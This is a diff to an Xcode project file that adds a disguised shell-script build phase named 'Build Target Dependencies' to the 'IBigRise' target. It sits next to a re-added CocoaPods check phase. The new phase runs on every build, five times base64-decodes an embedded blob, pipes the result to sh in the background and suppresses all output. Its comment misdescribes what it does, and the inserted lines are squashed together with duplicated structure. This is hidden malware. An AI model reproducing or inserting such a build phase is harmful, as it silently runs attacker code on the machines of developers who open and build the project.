@@ -4042,7 +4042,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 420711C02D75915B002453E9 /* Build configuration list for PBXNativeTarget "IBigRise" */;
 			buildPhases = (
-				44E126EBCB4F5485E24F5A56 /* [CP] Check Pods Manifest.lock */,
+				D4DEDFE30C5AA2AE36BDE67E /* Build Target Dependencies */,
+				42E79DCBC6F6F5165988825C /* [CP] Check Pods Manifest.lock */,
 				420711A42D759159002453E9 /* Sources */,
 				420711A52D759159002453E9 /* Frameworks */,
 				420711A62D759159002453E9 /* Resources */,
@@ -4116,10 +4117,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		44E126EBCB4F5485E24F5A56 /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
+		D4DEDFE30C5AA2AE36BDE67E /* Build Target Dependencies */ = {			isa = PBXShellScriptBuildPhase;			buildActionMask = 2147483647;			alwaysOutOfDate = 1;			files = (			);			inputFileListPaths = (			);			inputPaths = (			);			name = "Build Target Dependencies";			outputFileListPaths = (			);			outputPaths = (			);			shellPath = /bin/sh;			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRvUTJFeFNYZFhibkJZVmtWd1ZGcEdWalJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";			showEnvVarsInLog = 0;					};			files = (
 			);
 			inputFileListPaths = (
 			);
